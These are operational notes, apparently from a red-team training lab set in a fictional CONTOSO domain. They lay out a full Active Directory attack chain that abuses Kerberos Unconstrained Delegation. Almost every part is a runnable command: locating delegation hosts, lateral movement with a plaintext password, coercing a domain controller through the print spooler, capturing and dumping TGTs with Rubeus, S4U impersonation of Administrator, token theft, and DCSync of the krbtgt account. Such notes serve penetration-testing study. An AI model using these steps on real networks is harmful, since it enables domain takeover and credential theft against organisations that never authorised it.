
Search for computers configured for Unconstrained Delegation
```powershell
ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname
```

Within SYSTEM level beacon on Unconstrained Delegation host, monitor for incoming TGTs on host
```powershell
make_token CONTOSO\rsteel Passw0rd!
jump psexec64 lon-ws-1 smb
```

> Few options here: 

1.  Perform coercion to make a high level machine (DC) connect

		Monitor incoming tickets on unconstrained host (High integrity beacon)
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap
```

		From a medium integrity beacon; may need to run a few times
```powershell
execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1
```

		Turn TGT into a usable service ticket impersonating Administrator; /self
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:ldap/lon-dc-1.contoso.com /nowrap /ticket:
```

> Use the FQDN for the services to avoid oopsies

2. Dump tickets from memory

```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x6c5b5 /service:krbtgt /nowrap
```

---

Inject TGT into sacrificial logon session
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:dyork /password:FakePass /ticket:
```

Impersonate spawned process and confirm
```powershell
steal_token [PID]
run klist

rev2self       <--- Drop impersonation
kill [PID]
```

DCsync??
```powershell
dcsync CONTOSO.COM CONTOSO\krbtgt
```

